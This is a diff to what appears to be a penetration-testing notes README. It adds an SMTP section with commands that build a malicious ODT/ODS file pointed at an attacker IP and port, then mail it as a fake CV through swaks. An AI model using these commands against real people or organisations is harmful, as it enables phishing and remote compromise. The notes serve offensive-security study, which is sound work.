@@ -10,6 +10,7 @@ Enumeration, exploitation, and privilege escalation notes, all in one place.
     - [SMB](#smb)
     - [NFS](#nfs)
     - [SQL](#sql)
+    - [SMTP](#SMTP)
 - [Exploitation](#exploitation)
   - [Attacking Common Services](#attacking-common-services)
     - [Attacking SMB](#attacking-smb)
@@ -129,6 +130,16 @@ mssql
 ```bash
 impacket-mssqlclient <user>@<FQDN/IP> -windows-auth
 ```
+### SMTP
+```bash
+# Crafting a malicious ODT file
+python3 mmg-ods.py windows <ATTACKPORT> <ATTACKIP>
+python3 badodt.py
+
+# Sending emails using Swaks
+swaks --from getpwned@pwned.com --to career@job.local --header 'Subject: LhotseCV' --body 'Below is my attached CV' -attach @file.txt --server <IP>
+```
+
 # Exploitation
 ## Attacking Common Services
 ### Attacking SMB
